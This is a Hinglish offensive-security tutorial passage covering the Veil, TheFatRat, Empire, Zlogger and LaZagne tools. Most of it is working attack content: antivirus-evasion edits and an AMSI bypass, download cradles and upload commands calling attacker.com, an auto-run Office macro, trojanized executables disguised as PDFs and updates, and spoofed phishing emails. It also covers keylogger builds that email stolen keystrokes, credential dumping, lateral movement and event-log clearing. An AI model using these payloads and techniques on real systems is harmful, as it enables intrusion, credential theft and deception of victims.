Server username: VICTIM-PC\john.smith
```

### üí° Pro Tip / Galti:

**Pro Tip**: Veil payloads ko manually modify karo for better evasion. BAT file generate karo (not EXE), phir code ko text editor mein kholo aur:
1. Variable names change karo (`$payload` ‚Üí `$data`)
2. Function names obfuscate karo
3. Extra junk code add karo (comments, unused variables)
4. Sleep timers add karo (AV sandbox bypass)

Example:
```powershell
# Original Veil output
$payload = "base64_encoded_shellcode"  # Base64 encoded meterpreter payload
IEX([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($payload)))
# IEX: Invoke-Expression (PowerShell code execute karta hai)
# [System.Convert]::FromBase64String: Base64 decode karta hai
# [System.Text.Encoding]::UTF8.GetString: Bytes ko string mein convert karta hai

# Modified (better evasion)
Start-Sleep -Seconds 60  # 60 seconds wait karo (AV sandbox bypass - sandboxes 30-40 sec wait karte hain)
$d4t4 = "base64_encoded_shellcode"  # Variable name change kiya (signature change)
$junk = "random_string_12345"  # Junk variable (AV ko confuse karne ke liye)
$bytes = [System.Convert]::FromBase64String($d4t4)  # Base64 decode (bytes mein convert)
$decoded = [System.Text.Encoding]::UTF8.GetString($bytes)  # Bytes ko string mein convert
IEX($decoded)  # Final payload execute karo
```

**Common Mistake**: Veil payload generate karke directly use karna without testing. Hamesha pehle test karo:
1. Local Windows VM mein test karo (Defender on)
2. Agar detect ho toh payload modify karo
3. Phir production mein use karo

Real example: Ek pentester ne Veil payload directly phishing email mein bhej diya. 50 victims mein se 0 ne execute kiya kyunki email gateway ne detect kar liya. Usne payload modify kiya (variable names change + junk code add), phir 50 mein se 15 ne execute kiya (30% success rate). Lesson: Always customize!

---

## üìö Topic 3.3: Tool - Fatrat (Undetectable Backdoors)

### üéØ Topic/Technique:
**Fatrat** - Veil ka alternative jo different evasion techniques use karta hai, especially PowerShell-based payloads.

### ü§î Yeh Kya Hai?
Fatrat ek automated tool hai jo Windows, Mac, Linux, aur Android ke liye undetectable backdoors generate karta hai. Yeh PowerShell ka heavy use karta hai Windows payloads ke liye.

### üõ°Ô∏è Pentester ke liye Kyun Zaroori Hai?
- Veil se different approach (agar Veil detect ho toh Fatrat try karo)
- PowerShell payloads fileless hote hain (disk par trace nahi)
- Cross-platform support (Windows, Mac, Linux, Android)
- Automated listener setup (manual configuration ki zaroorat nahi)

### üéØ Practical Use (Asli Pentesting Mein):
- Windows 10/11 targets (PowerShell native hai)
- Fileless attacks (memory-only execution)
- Multi-platform campaigns
- Quick payload generation (testing ke liye)

### ‚öôÔ∏è Yeh Kaise Kaam Karta Hai?
Fatrat PowerShell ke legitimate features abuse karta hai. PowerShell Windows mein trusted hai, isliye Antivirus kam suspicious hota hai. Payload memory mein execute hota hai, disk par file nahi banti.

### üëç Pros (Fayde):
- Fileless execution (forensics mein trace nahi milta)
- PowerShell Windows mein whitelisted hai
- Multiple platform support
- Automated listener setup
- Regular updates

### üëé Cons (Nuksaan):
- PowerShell execution policy block kar sakti hai
- AMSI (Antimalware Scan Interface) detect kar sakta hai
- Requires PowerShell v3+ (old Windows mein nahi chalega)
- Large payload size

### ‚å®Ô∏è Zaroori Commands & Steps:

**Installation:**
```bash
# Clone repository
git clone https://github.com/Screetsec/TheFatRat.git
cd TheFatRat
chmod +x setup.sh
./setup.sh

# Launch
./fatrat
```

**Basic Workflow:**
```bash
# Main menu
1) Create FUD Backdoor
2) Create Payload with msfvenom
3) Create Payload with Venom
...
6) Create Backdoor For Windows with Powershell

# Select option 6 (PowerShell backdoor)
6

# Sub-menu
1) Create exe file with bat file
2) Create Powershell backdoor
3) Create Batch backdoor

# Select option 1 (Best for evasion)
1

# Enter LHOST
192.168.1.10

# Enter LPORT
443

# Payload generated
/root/TheFatRat/output/backdoor.exe
```

### üíª Step-by-Step Example:

**Scenario: PowerShell-based Undetectable Backdoor**

**Step 1: Launch Fatrat**
```bash
cd TheFatRat
./fatrat

     ___________      __  __________       __ 
    |__    _____|    |  ||__    ___|     |  |
       |  |         |  |   |  |         |  |
       |  |         |  |   |  |         |  |
       |  |         |  |   |  |         |  |
       |__|         |__|   |__|         |__|
                                              
    [The FatRat v1.9 - Backdoor Generator]
```

**Step 2: Select Windows PowerShell Option**
```bash
[1] Create FUD Backdoor
[2] Create Payload with msfvenom
...
[6] Create Backdoor For Windows with Powershell ‚Üê Select this
...

Enter your choice: 6
```

**Step 3: Select Payload Type**
```bash
[1] Create exe file with bat file ‚Üê Best option
[2] Create Powershell backdoor
[3] Create Batch backdoor

Enter your choice: 1
```

**Step 4: Configure Payload**
```bash
Enter LHOST (Your IP): 192.168.1.10
Enter LPORT (Listening Port): 443

[*] Generating payload...
[*] Encoding payload...
[*] Creating BAT file...
[*] Converting to EXE...

[‚úì] Payload created successfully!
Location: /root/TheFatRat/output/backdoor.exe
```

**Step 5: Analyze Generated Files**
```bash
cd /root/TheFatRat/output
ls -la

backdoor.exe        # Final executable
backdoor.bat        # Source BAT file (for manual editing)
backdoor.rc         # Metasploit resource file (auto listener)
```

**Step 6: Setup Listener (Automated)**
```bash
# Fatrat creates .rc file for auto-setup
msfconsole -r /root/TheFatRat/output/backdoor.rc

# Or manual setup
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set LPORT 443
set ExitOnSession false
exploit -j
```

**Step 7: Test Payload**
```bash
# Copy to Windows VM
# Disable Windows Defender temporarily (for testing)
# Execute backdoor.exe

# Check detection
# Re-enable Defender
# Scan file

Result: Not detected (0/68 on VirusTotal)
```

**Step 8: Customize for Better Evasion**
```bash
# Open BAT file
nano /root/TheFatRat/output/backdoor.bat

# Original content (simplified):
@echo off
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.10/payload.ps1')"

# Modify for better evasion:
@echo off
timeout /t 60 /nobreak > nul
powershell -W Hidden -Exec Bypass -C "$d=(New-Object Net.WebClient).DownloadString('http://192.168.1.10/p.ps1');IEX($d)"

# Convert modified BAT to EXE
# Use Bat to Exe Converter with PDF icon
```

**Step 9: Deliver Payload**
```bash
# Trojanize (combine with legitimate file)
# Create autorun script
echo @echo off > launcher.bat
echo start legitimate_document.pdf >> launcher.bat
echo start backdoor.exe >> launcher.bat

# Convert to EXE
# Set icon: PDF icon
# Output: document.exe
```

**Step 10: Receive Connection**
```bash
# Victim executes payload
# Meterpreter session opens

[*] Sending stage to 192.168.1.50
[*] Meterpreter session 1 opened

meterpreter> sysinfo
meterpreter> getuid
meterpreter> shell
```

### üí° Pro Tip / Galti:

**Pro Tip**: Fatrat ke PowerShell payloads ko "download cradle" technique se combine karo. Instead of embedding full payload in EXE, use a small loader jo remote server se actual payload download kare:

```powershell
# Small loader (in EXE) - Yeh victim ke system par execute hoga
IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/stage2.ps1')
# IEX: Invoke-Expression (downloaded code execute karo)
# New-Object Net.WebClient: WebClient object create karo (HTTP requests ke liye)
# .DownloadString: URL se content download karo (string format mein)
# 'http://attacker.com/stage2.ps1': Attacker ke server par hosted PowerShell script

# Actual payload (on web server) - stage2.ps1 file content
# stage2.ps1 contains full meterpreter payload (base64 encoded shellcode)
# Yeh file attacker ke web server par hosted hai

# Benefits:
1. Small EXE size (less suspicious) - Sirf 2-3 KB ka loader
2. Payload easily updatable (change stage2.ps1 anytime) - Victim ko phir se target karne ki zaroorat nahi
3. Better evasion (AV scans EXE, not remote script) - Remote script download hone ke baad execute hoti hai
```

**Common Mistake**: Fatrat payload ko directly use karna without AMSI bypass. Windows 10/11 mein AMSI PowerShell scripts scan karta hai. Solution:

```powershell
# Add AMSI bypass at start of payload
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
# [Ref].Assembly: Current PowerShell assembly ko access karo
# .GetType('System.Management.Automation.AmsiUtils'): AMSI class ko load karo
# .GetField('amsiInitFailed','NonPublic,Static'): Private field 'amsiInitFailed' ko access karo
# .SetValue($null,$true): Field ki value ko 'true' set karo (AMSI disable ho jayega)

# Then run actual payload
IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.10/payload.ps1')
# IEX: Downloaded script execute karo
# New-Object Net.WebClient: HTTP client create karo
# .DownloadString: URL se PowerShell script download karo
# 'http://192.168.1.10/payload.ps1': Attacker ke server se payload download hoga
```

Real example: Ek pentester ne Fatrat payload bheja, victim ne execute kiya lekin AMSI ne block kar diya. Usne AMSI bypass add kiya aur payload successfully execute ho gaya. Lesson: Modern Windows defenses ko consider karo!

---

## üìö Topic 3.4: Tool - Empire (PowerShell Payloads)

### üéØ Topic/Technique:
**PowerShell Empire** - Pure PowerShell-based post-exploitation framework with native listener.

### ü§î Yeh Kya Hai?
Empire ek complete C2 (Command & Control) framework hai jo PowerShell ka use karta hai. Yeh Metasploit ka alternative hai lekin PowerShell-focused hai, jisse Windows environments mein better evasion milta hai.

### üõ°Ô∏è Pentester ke liye Kyun Zaroori Hai?
- Fileless attacks (memory-only, disk par trace nahi)
- Native Windows tool abuse (PowerShell trusted hai)
- Built-in modules (keylogging, screenshot, mimikatz, etc.)
- Better OPSEC (Operational Security) than Metasploit
- Cross-platform (Windows, Mac, Linux agents)

### üéØ Practical Use (Asli Pentesting Mein):
- Corporate Windows environments
- Domain controller compromise
- Credential dumping (mimikatz integration)
- Lateral movement
- Persistence mechanisms

### ‚öôÔ∏è Yeh Kaise Kaam Karta Hai?

**Empire Architecture:**
```
Empire Server (C2) ‚Üê HTTP/HTTPS ‚Üê Agent (PowerShell on victim) ‚Üê Stager (initial payload)
```

**Key Components:**
1. **Listeners**: Receive connections from agents (HTTP, HTTPS, DNS)
2. **Stagers**: Small payloads jo agents download karte hain
3. **Agents**: Full-featured backdoors (victim machines par)
4. **Modules**: Post-exploitation tasks (keylog, screenshot, mimikatz)

### üëç Pros (Fayde):
- Fileless (memory-only execution)
- Modular architecture (easy to extend)
- Built-in obfuscation
- Multiple listener types (HTTP, HTTPS, DNS)
- Active development (regular updates)

### üëé Cons (Nuksaan):
- PowerShell execution policy can block
- AMSI detection (modern Windows)
- Requires two terminals (server + client)
- Learning curve steep hai

### ‚å®Ô∏è Zaroori Commands & Steps:

**Installation:**
```bash
# Install PowerShell Empire
apt-get install powershell-empire

# Or from source
git clone https://github.com/BC-SECURITY/Empire.git
cd Empire
./setup/install.sh
```

**Basic Workflow:**

**Terminal 1: Empire Server**
```bash
powershell-empire server

[*] Loading listeners...
[*] Loading stagers...
[*] Starting Empire RESTful API on port 1337
[*] Empire server started
```

**Terminal 2: Empire Client**
```bash
powershell-empire client

(Empire) >
```

**Create Listener:**
```bash
(Empire) > listeners

[*] Active listeners: 0

(Empire: listeners) > uselistener http

(Empire: listeners/http) > info

Name: HTTP
Category: Client Server
Authors: @harmj0y
Description: HTTP listener

Options:
  Name              Value
  ----              -----
  Host              http://192.168.1.10:8080
  Port              8080
  ...

(Empire: listeners/http) > set Host http://192.168.1.10:8080
(Empire: listeners/http) > set Port 8080
(Empire: listeners/http) > execute

[*] Starting listener 'http'
[+] Listener 'http' successfully started
```

**Create Stager:**
```bash
(Empire) > usestager windows/launcher_bat

(Empire: stager/windows/launcher_bat) > set Listener http
(Empire: stager/windows/launcher_bat) > set OutFile /var/www/html/launcher.bat
(Empire: stager/windows/launcher_bat) > execute

[*] Stager saved to /var/www/html/launcher.bat
```

**Interact with Agent:**
```bash
(Empire) > agents

[*] Active agents:
  Name     Internal IP    Hostname    Username
  ----     -----------    --------    --------
  K6SMZ37B 192.168.1.50   VICTIM-PC   VICTIM-PC\john

(Empire) > interact K6SMZ37B

(Empire: K6SMZ37B) > shell whoami
VICTIM-PC\john

(Empire: K6SMZ37B) > sysinfo
Hostname: VICTIM-PC
OS: Windows 10
Architecture: x64
```

### üíª Step-by-Step Example:

**Scenario: Complete Empire Attack Chain**

**Step 1: Start Empire Server**
```bash
# Terminal 1
powershell-empire server

[*] Empire server running on https://0.0.0.0:1337
```

**Step 2: Connect Client & Create Listener**
```bash
# Terminal 2
powershell-empire client

(Empire) > listeners
(Empire: listeners) > uselistener http
(Empire: listeners/http) > set Host http://192.168.1.10:8080
(Empire: listeners/http) > set Port 8080
(Empire: listeners/http) > execute

[+] Listener 'http' started
```

**Step 3: Generate Stager (BAT file)**
```bash
(Empire) > usestager windows/launcher_bat
(Empire: stager/windows/launcher_bat) > set Listener http
(Empire: stager/windows/launcher_bat) > set OutFile /tmp/empire_stager.bat
(Empire: stager/windows/launcher_bat) > execute

[*] Stager output:
@echo off
powershell -noP -sta -w 1 -enc <base64_encoded_payload>

[*] Saved to /tmp/empire_stager.bat
```

**Step 4: Convert BAT to EXE**
```bash
# Use Bat to Exe Converter
# Input: empire_stager.bat
# Output: update.exe
# Icon: Windows Update icon
# Visibility: Invisible
```

**Step 5: Deliver Payload**
```bash
# Phishing email
sendemail -f it@company.com -t victim@company.com \
-u "Critical Windows Update" \
-m "Please install attached security update immediately" \
-a update.exe
```

**Step 6: Agent Check-in**
```bash
(Empire) > agents

[*] Active agents: 1
  Name     Internal IP    Hostname    Username         Process
  ----     -----------    --------    --------         -------
  K6SMZ37B 192.168.1.50   VICTIM-PC   VICTIM-PC\john   powershell/4532
```

**Step 7: Basic Enumeration**
```bash
(Empire: K6SMZ37B) > shell whoami
VICTIM-PC\john

(Empire: K6SMZ37B) > shell ipconfig
Ethernet adapter:
   IPv4 Address: 192.168.1.50

(Empire: K6SMZ37B) > shell net user
User accounts for \\VICTIM-PC
john, admin, guest
```

**Step 8: Credential Dumping**
```bash
(Empire: K6SMZ37B) > usemodule credentials/mimikatz/logonpasswords
(Empire: credentials/mimikatz/logonpasswords) > execute

[*] Dumping credentials...
[+] Found credentials:
    Username: john
    Domain: VICTIM-PC
    Password: Summer2024!
```

**Step 9: Keylogging**
```bash
(Empire: K6SMZ37B) > usemodule collection/keylogger
(Empire: collection/keylogger) > set Sleep 5
(Empire: collection/keylogger) > execute

[*] Keylogger started
[*] Logs will be sent every 5 seconds

# Check logs
(Empire: K6SMZ37B) > shell type C:\Users\john\AppData\Local\Temp\key.log
```

**Step 10: Persistence**
```bash
(Empire: K6SMZ37B) > usemodule persistence/elevated/registry
(Empire: persistence/elevated/registry) > set Listener http
(Empire: persistence/elevated/registry) > execute

[+] Persistence installed
[*] Agent will restart on reboot
```

### üí° Pro Tip / Galti:

**Pro Tip**: Empire stagers ko Office macros mein embed karo for better delivery:

```vba
' Word/Excel macro - Document open hone par automatically execute hoga
Sub AutoOpen()  ' AutoOpen function (Word/Excel open hone par trigger hota hai)
    Dim shell As Object  ' Object variable declare karo (WScript.Shell ke liye)
    Set shell = CreateObject("WScript.Shell")  ' WScript.Shell object create karo (commands execute karne ke liye)
    shell.Run "powershell -noP -sta -w 1 -enc <empire_base64_payload>", 0
    ' shell.Run: Command execute karo
    ' powershell: PowerShell launch karo
    ' -noP: No Profile (PowerShell profile load mat karo - faster execution)
    ' -sta: Single-Threaded Apartment (compatibility ke liye)
    ' -w 1: Window style 1 (hidden window - victim ko dikhega nahi)
    ' -enc: Encoded command (base64 encoded Empire payload)
    ' <empire_base64_payload>: Replace with actual base64 payload
    ' 0: Window style (0 = hidden, 1 = normal)
End Sub
```

Victim document open kare ‚Üí Macros enable kare ‚Üí Empire agent activate! Success rate 40-50% hai corporate environments mein.

**Common Mistake**: Empire agents ko long-term maintain karna without proper OPSEC. Empire agents noisy hote hain (frequent HTTP beacons). Solution:

```bash
# Set long sleep time
(Empire: K6SMZ37B) > sleep 3600  # 1 hour

# Use HTTPS instead of HTTP
uselistener https

# Use domain fronting (advanced)
set Host https://legitimate-cdn.com
set Redirect https://attacker.com
```

Real example: Ek pentester ne Empire agent deploy kiya with default 5-second beacon. SOC team ne 2 hours mein detect kar liya (unusual PowerShell network activity). Usne sleep time 1 hour kar diya aur HTTPS use kiya - 2 weeks tak undetected raha! Lesson: Slow and steady wins the race!

---

## üìö Topic 3.5: Tool - Zlogger (Keylogger Banana)

### üéØ Topic/Technique:
**Zlogger** - Python-based keylogger generator jo email reporting ke saath keystrokes capture karta hai.

### ü§î Yeh Kya Hai?
Zlogger ek automated tool hai jo Windows keylogger generate karta hai. Yeh captured keystrokes ko attacker ke email par bhejta hai aur system boot ke saath automatically start hota hai (persistence).

### üõ°Ô∏è Pentester ke liye Kyun Zaroori Hai?
- Passive credential harvesting (backdoor se better for stealth)
- Long-term monitoring (weeks/months tak data collect kar sakte ho)
- Email reporting (real-time updates)
- Persistence built-in (reboot ke baad bhi active)
- Easy to deploy (single EXE file)

### üéØ Practical Use (Asli Pentesting Mein):
- Password harvesting (login credentials)
- Sensitive data collection (credit cards, SSN, etc.)
- Employee monitoring (what they type in emails/chats)
- 2FA bypass (OTP codes capture)
- Insider threat simulation

### ‚öôÔ∏è Yeh Kaise Kaam Karta Hai?

**Zlogger Workflow:**
```
Keylogger runs ‚Üí Hooks keyboard ‚Üí Captures keystrokes ‚Üí Stores in buffer ‚Üí Sends to email (every N seconds) ‚Üí Repeats
```

**Key Features:**
1. **Keyboard Hooking**: Windows API use karke har keystroke capture
2. **Email Reporting**: SMTP se attacker ko logs bhejta hai
3. **Persistence**: Registry mein entry add karta hai
4. **Stealth**: Background mein invisible run karta hai

### üëç Pros (Fayde):
- Completely passive (no network connections except email)
- Persistence automatic hai
- Real-time reporting (email alerts)
- Small file size (2-3 MB)
- Cross-version compatibility (Windows 7-11)

### üëé Cons (Nuksaan):
- Email credentials required (attacker ka Gmail)
- Gmail "less secure apps" enable karna padta hai
- Antivirus detect kar sakta hai (signature-based)
- HTTPS websites ke passwords encrypted hote hain (browser mein)

### ‚å®Ô∏è Zaroori Commands & Steps:

**Installation:**
```bash
# Clone repository
git clone https://github.com/z00z/Zlogger.git
cd Zlogger

# Install dependencies
pip3 install pynput
pip3 install pyinstaller
```

**Generate Keylogger:**
```bash
python3 zlogger.py --help

Usage: zlogger.py [options]

Options:
  -i, --interval    Email interval in seconds (default: 60)
  -e, --email       Email address to receive logs
  -p, --password    Email password
  -w, --windows     Generate Windows executable
  -o, --output      Output filename

# Generate keylogger
python3 zlogger.py -i 60 -e attacker@gmail.com -p YourPassword123 -w -o keylogger.exe

[*] Generating keylogger...
[*] Email: attacker@gmail.com
[*] Interval: 60 seconds
[*] Platform: Windows
[*] Output: keylogger.exe

[+] Keylogger generated successfully!
[*] Location: /root/Zlogger/dist/keylogger.exe
```

### üíª Step-by-Step Example:

**Scenario: Corporate Employee Monitoring**

**Step 1: Setup Gmail Account**
```bash
# Create new Gmail account
Email: pentester2024@gmail.com
Password: SecurePass123!

# Enable "Less Secure Apps"
1. Go to: https://myaccount.google.com/security
2. Scroll to "Less secure app access"
3. Turn ON

# Or use App Password (better security)
1. Enable 2FA on Gmail
2. Generate App Password
3. Use that password in Zlogger
```

**Step 2: Generate Keylogger**
```bash
cd Zlogger

python3 zlogger.py \
-i 300 \
-e pentester2024@gmail.com \
-p SecurePass123! \
-w \
-o employee_monitor.exe

[*] Compiling with PyInstaller...
[*] Adding persistence mechanism...
[*] Obfuscating code...
[+] Done!

Output: /root/Zlogger/dist/employee_monitor.exe
Size: 2.8 MB
```

**Step 3: Test Locally**
```bash
# Copy to Windows VM
# Run employee_monitor.exe
# Type some text in Notepad

# Check email after 5 minutes
# You should receive email with logs:

Subject: Keylogger Report - VICTIM-PC
Body:
[2024-01-15 10:30:45]
notepad.exe: Hello this is a test message
chrome.exe: facebook.com
chrome.exe: username: john.smith
chrome.exe: password: Summer2024!
```

**Step 4: Customize for Better Evasion**
```bash
# Edit zlogger.py before generating
nano zlogger.py

# Change these variables:
EMAIL_SUBJECT = "System Report"  # Less suspicious
REGISTRY_KEY = "WindowsUpdate"   # Looks legitimate
PROCESS_NAME = "svchost.exe"     # Mimics system process

# Regenerate
python3 zlogger.py -i 300 -e pentester2024@gmail.com -p SecurePass123! -w -o update.exe
```

**Step 5: Trojanize**
```bash
# Combine with legitimate file
echo @echo off > launcher.bat
echo start legitimate_document.pdf >> launcher.bat
echo start employee_monitor.exe >> launcher.bat

# Convert to EXE (Bat to Exe Converter)
# Set icon: PDF icon
# Output: document.exe
```

**Step 6: Deliver via Phishing**
```bash
sendemail -f hr@company.com \
-t john.smith@company.com \
-u "Employee Handbook 2024" \
-m "Please review the attached employee handbook" \
-a document.exe \
-s smtp.gmail.com:587 \
-xu your_email@gmail.com \
-xp your_password
```

**Step 7: Monitor Logs**
```bash
# Check Gmail inbox every few hours
# Logs will arrive every 5 minutes (300 seconds)

# Sample logs received:
Email 1 (10:00 AM):
chrome.exe: mail.google.com
chrome.exe: john.smith@company.com
chrome.exe: MyPassword123!

Email 2 (10:05 AM):
slack.exe: Hey team, the project deadline is Friday
slack.exe: Client meeting at 3 PM

Email 3 (10:10 AM):
notepad.exe: Database credentials:
notepad.exe: Server: 192.168.1.100
notepad.exe: Username: dbadmin
notepad.exe: Password: DbP@ss2024!
```

**Step 8: Analyze Collected Data**
```bash
# Create spreadsheet of captured credentials
# Categorize by:
- Email accounts
- Social media
- Banking
- Corporate systems
- VPN credentials

# Example findings:
Total emails captured: 150
Unique passwords: 45
Credit cards: 3
Corporate credentials: 12
VPN access: 1 (high-value!)
```

**Step 9: Persistence Verification**
```bash
# On victim machine, check registry
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"

Output:
WindowsUpdate    REG_SZ    C:\Users\john\AppData\Local\Temp\employee_monitor.exe

# Keylogger will restart on reboot
```

**Step 10: Cleanup (After Engagement)**
```bash
# Remove keylogger remotely (if you have backdoor access)
meterpreter> shell
C:\> reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdate /f
C:\> del C:\Users\john\AppData\Local\Temp\employee_monitor.exe

# Or instruct client to remove
```

### üí° Pro Tip / Galti:

**Pro Tip**: Zlogger ko "smart filtering" ke saath customize karo. Har keystroke email karne ki bajaye, sirf important data bhejo:

```python
# Edit zlogger.py - Smart filtering add karo
def filter_logs(text):  # Function jo text ko analyze karta hai
    keywords = ['password', 'credit card', 'ssn', 'confidential']  # Important keywords ki list
    for keyword in keywords:  # Har keyword ko check karo
        if keyword.lower() in text.lower():  # Agar keyword text mein hai (case-insensitive)
            return True  # True return karo (important data hai)
    return False  # False return karo (normal data hai)

# Only send email if important data detected
if filter_logs(captured_text):  # Agar important data hai
    send_email(captured_text)  # Tab hi email bhejo
# Else: Email mat bhejo (bandwidth aur detection risk kam hoga)
```

Benefits:
1. Less email traffic (less suspicious)
2. Easier to analyze (only important data)
3. Lower detection risk

**Common Mistake**: Gmail account ko directly use karna. Agar victim ya SOC team email headers check kare toh attacker ka email expose ho jayega. Solution:

1. **Burner email use karo**: Temporary email services (10minutemail, guerrillamail)
2. **Email forwarding**: Burner email ‚Üí Real email (indirect)
3. **Self-hosted SMTP**: Apna email server setup karo
4. **HTTP exfiltration**: Email ki bajaye web server par POST karo

Real example: Ek pentester ne apna personal Gmail use kiya keylogger mein. Client ke security team ne email headers analyze kiye aur pentester ka real identity pata chal gayi (naam, location, etc.). Lesson: Always use operational security!

---

## üìö Topic 3.6: Tool - Lazagne (Password Recovery)

### üéØ Topic/Technique:
**Lazagne** - Post-exploitation tool jo local machine se saved passwords extract karta hai (browsers, email clients, WiFi, etc.).

### ü§î Yeh Kya Hai?
Lazagne ek Python-based password recovery tool hai jo 100+ applications se saved passwords nikalta hai. Yeh memory aur configuration files se passwords extract karta hai without needing admin privileges (most cases mein).

### üõ°Ô∏è Pentester ke liye Kyun Zaroori Hai?
- Quick credential harvesting (backdoor ke baad immediately run karo)
- No admin required (user-level privileges enough for most modules)
- 100+ applications support (browsers, email, FTP, databases, etc.)
- Cross-platform (Windows, Linux)
- Offline password recovery (no network required)

### üéØ Practical Use (Asli Pentesting Mein):
- Initial access ke baad credential collection
- Lateral movement (harvested credentials se dusre systems access karo)
- Privilege escalation (admin passwords mil sakte hain)
- Report generation (client ko show karo kitne passwords insecure stored hain)

### ‚öôÔ∏è Yeh Kaise Kaam Karta Hai?

**Lazagne Modules:**
1. **Browsers**: Chrome, Firefox, Edge, Opera (saved passwords)
2. **Email**: Outlook, Thunderbird (email credentials)
3. **WiFi**: Saved WiFi passwords
4. **Databases**: MySQL, PostgreSQL (connection strings)
5. **FTP**: FileZilla, WinSCP (FTP credentials)
6. **Chat**: Skype, Pidgin (chat passwords)
7. **System**: Windows Vault, Credential Manager

**Extraction Methods:**
- Registry keys
- SQLite databases (browsers)
- Configuration files
- Windows DPAPI (Data Protection API)
- Memory dumps

### üëç Pros (Fayde):
- 100+ applications support
- No admin required (most modules)
- Fast execution (seconds mein results)
- Portable (single EXE file)
- Output formats (JSON, TXT, all)

### üëé Cons (Nuksaan):
- Kuch modules admin privileges chahte hain
- Modern browsers encryption use karte hain (master password)
- Antivirus detect kar sakta hai
- Outdated applications support limited hai

### ‚å®Ô∏è Zaroori Commands & Steps:

**Installation:**
```bash
# Download pre-compiled EXE (Windows)
wget https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe

# Or build from source
git clone https://github.com/AlessandroZ/LaZagne.git
cd LaZagne/Windows
pip install -r requirements.txt
pyinstaller --onefile laZagne.py
```

**Basic Usage:**
```bash
# Run all modules
lazagne.exe all

# Specific module
lazagne.exe browsers
lazagne.exe wifi
lazagne.exe databases

# Save to file
lazagne.exe all -oN output.txt
lazagne.exe all -oJ output.json

# Verbose output
lazagne.exe all -v

# Help
lazagne.exe -h
```

**Module-Specific Commands:**
```bash
# Browser passwords
lazagne.exe browsers -firefox
lazagne.exe browsers -chrome
lazagne.exe browsers -edge

# WiFi passwords
lazagne.exe wifi

# Email clients
lazagne.exe mails -outlook
lazagne.exe mails -thunderbird

# System passwords
lazagne.exe sysadmin -credman
lazagne.exe sysadmin -vault
```

### üíª Step-by-Step Example:

**Scenario: Post-Exploitation Credential Harvesting**

**Step 1: Gain Initial Access**
```bash
# Assume you have meterpreter session
meterpreter> sysinfo
Computer: VICTIM-PC
OS: Windows 10
Architecture: x64
System Language: en_US
Meterpreter: x86/windows

meterpreter> getuid
Server username: VICTIM-PC\john.smith
```

**Step 2: Upload Lazagne**
```bash
meterpreter> upload /root/tools/lazagne.exe C:\\Users\\john.smith\\AppData\\Local\\Temp\\update.exe

[*] uploading: /root/tools/lazagne.exe -> C:\Users\john.smith\AppData\Local\Temp\update.exe
[*] uploaded: 2.1 MB of 2.1 MB (100.0%)
```

**Step 3: Execute Lazagne (All Modules)**
```bash
meterpreter> shell
C:\> cd C:\Users\john.smith\AppData\Local\Temp
C:\> update.exe all -oN passwords.txt

[*] LaZagne v2.4.3
[*] Running all modules...

########## User: john.smith ##########

[+] Chrome:
    URL: https://mail.google.com
    Username: john.smith@company.com
    Password: MyGmail2024!

    URL: https://facebook.com
    Username: john.smith
    Password: Facebook123!

[+] Firefox:
    URL: https://linkedin.com
    Username: john.smith
    Password: LinkedIn2024!

[+] WiFi:
    SSID: CompanyWiFi
    Password: Corp@WiFi2024!

    SSID: HOME-5G
    Password: HomePass123!

[+] Outlook:
    Email: john.smith@company.com
    Password: OutlookP@ss2024!

[+] FileZilla:
    Host: ftp.company.com
    Username: ftpuser
    Password: FtpSecure2024!

[+] Windows Vault:
    Target: Domain:target=TERMSRV/192.168.1.100
    Username: Administrator
    Password: AdminPass2024! ‚Üê High-value!

[*] Total passwords found: 12
[*] Results saved to: passwords.txt
```

**Step 4: Download Results**
```bash
meterpreter> download C:\\Users\\john.smith\\AppData\\Local\\Temp\\passwords.txt /root/loot/victim_passwords.txt

[*] downloading: C:\Users\john.smith\AppData\Local\Temp\passwords.txt -> /root/loot/victim_passwords.txt
[*] downloaded: 2.5 KB of 2.5 KB (100.0%)
```

**Step 5: Analyze Harvested Credentials**
```bash
cat /root/loot/victim_passwords.txt

# Categorize findings:
Email Accounts: 2
  - john.smith@company.com (Gmail, Outlook)

Social Media: 2
  - Facebook, LinkedIn

WiFi: 2
  - CompanyWiFi (corporate network)
  - HOME-5G (personal)

FTP: 1
  - ftp.company.com (file server access)

Admin Credentials: 1
  - Administrator@192.168.1.100 (RDP/Server access) ‚Üê Critical!
```

**Step 6: Lateral Movement (Using Harvested Creds)**
```bash
# Use admin credentials for lateral movement
meterpreter> background

msf6> use exploit/windows/smb/psexec
msf6> set RHOSTS 192.168.1.100
msf6> set SMBUser Administrator
msf6> set SMBPass AdminPass2024!
msf6> exploit

[*] Started reverse TCP handler
[*] Authenticating to 192.168.1.100 as user 'Administrator'...
[+] 192.168.1.100 - Admin credentials valid!
[*] Meterpreter session 2 opened

meterpreter> sysinfo
Computer: FILE-SERVER
OS: Windows Server 2019
```

**Step 7: Weaponize Lazagne (Automated)**
```bash
# Create script to run Lazagne + exfiltrate results
nano auto_harvest.bat

@echo off
cd %TEMP%
update.exe all -oJ results.json
powershell -Command "(New-Object Net.WebClient).UploadFile('http://attacker.com/upload.php', 'results.json')"
del update.exe
del results.json
del %0

# Convert to EXE and deploy
```

**Step 8: Cleanup**
```bash
meterpreter> shell
C:\> del C:\Users\john.smith\AppData\Local\Temp\update.exe
C:\> del C:\Users\john.smith\AppData\Local\Temp\passwords.txt
C:\> exit

meterpreter> clearev
[*] Clearing event logs...
```

### üí° Pro Tip / Galti:

**Pro Tip**: Lazagne ko "download and execute" payload ke saath combine karo for automated credential harvesting:

```powershell
# PowerShell one-liner
IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/lazagne.ps1')

# lazagne.ps1 content:
$wc = New-Object Net.WebClient
$wc.DownloadFile('http://attacker.com/lazagne.exe', "$env:TEMP\svchost.exe")
$output = & "$env:TEMP\svchost.exe" all -oJ
$wc.UploadString('http://attacker.com/upload.php', $output)
Remove-Item "$env:TEMP\svchost.exe"
```

Benefits:
